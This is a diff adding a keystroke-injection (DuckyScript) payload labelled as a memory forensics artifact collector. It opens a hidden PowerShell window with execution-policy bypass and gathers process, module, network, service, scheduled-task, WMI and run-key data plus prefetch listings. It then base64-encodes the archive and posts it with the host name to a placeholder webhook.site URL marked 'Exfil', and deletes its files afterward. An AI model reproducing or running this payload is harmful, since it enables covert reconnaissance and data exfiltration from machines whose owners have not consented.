@@ -1,0 +1,79 @@
+REM NullSec - Memory Forensics Artifact Collector
+REM Collects volatile memory artifacts without full dump
+REM Targets: process lists, handles, loaded DLLs, network connections
+
+GUI r
+DELAY 500
+STRING powershell -w hidden -ep bypass
+ENTER
+DELAY 1000
+
+REM Collect process memory artifacts
+STRING $artifacts = @{}
+ENTER
+DELAY 100
+
+REM Process list with command lines
+STRING $artifacts.Processes = Get-WmiObject Win32_Process | Select ProcessId, Name, CommandLine, ExecutablePath, CreationDate | ConvertTo-Json
+ENTER
+DELAY 500
+
+REM Loaded DLLs for suspicious processes
+STRING $artifacts.LoadedModules = Get-Process | ForEach-Object { @{Name=$_.Name; PID=$_.Id; Modules=$_.Modules.FileName} } | ConvertTo-Json
+ENTER
+DELAY 500
+
+REM Network connections with owning process
+STRING $artifacts.NetConnections = Get-NetTCPConnection | Select LocalAddress, LocalPort, RemoteAddress, RemotePort, State, OwningProcess | ConvertTo-Json
+ENTER
+DELAY 300
+
+REM Services running from unusual paths
+STRING $artifacts.SuspiciousServices = Get-WmiObject Win32_Service | Where-Object { $_.PathName -notmatch 'system32|Program Files' } | Select Name, PathName, State | ConvertTo-Json
+ENTER
+DELAY 300
+
+REM Scheduled tasks
+STRING $artifacts.ScheduledTasks = Get-ScheduledTask | Where-Object {$_.State -eq 'Ready'} | Select TaskName, TaskPath | ConvertTo-Json
+ENTER
+DELAY 300
+
+REM WMI persistence
+STRING $artifacts.WMIPersistence = Get-WmiObject -Namespace root\subscription -Class __EventConsumer -ErrorAction SilentlyContinue | ConvertTo-Json
+ENTER
+DELAY 300
+
+REM Registry run keys
+STRING $runKeys = @('HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run')
+ENTER
+STRING $artifacts.RunKeys = $runKeys | ForEach-Object { if(Test-Path $_) { Get-ItemProperty $_ } } | ConvertTo-Json
+ENTER
+DELAY 200
+
+REM Prefetch files (execution evidence)
+STRING $artifacts.Prefetch = Get-ChildItem C:\Windows\Prefetch -ErrorAction SilentlyContinue | Select Name, CreationTime, LastWriteTime | Sort LastWriteTime -Desc | Select -First 50 | ConvertTo-Json
+ENTER
+DELAY 300
+
+REM Export
+STRING $artifacts | ConvertTo-Json -Depth 10 | Out-File "$env:TEMP\mem_artifacts.json" -Encoding UTF8
+ENTER
+DELAY 200
+
+REM Compress and prepare for exfil
+STRING Compress-Archive -Path "$env:TEMP\mem_artifacts.json" -DestinationPath "$env:TEMP\artifacts.zip" -Force
+ENTER
+DELAY 500
+
+REM Exfil (modify endpoint)
+STRING $bytes = [IO.File]::ReadAllBytes("$env:TEMP\artifacts.zip")
+ENTER
+STRING $b64 = [Convert]::ToBase64String($bytes)
+ENTER
+STRING Invoke-RestMethod -Uri "https://webhook.site/YOUR-ID" -Method Post -Body @{data=$b64;host=$env:COMPUTERNAME} -ErrorAction SilentlyContinue
+ENTER
+DELAY 1000
+
+REM Cleanup
+STRING Remove-Item "$env:TEMP\mem_artifacts.json","$env:TEMP\artifacts.zip" -Force 2>$null; exit
+ENTER
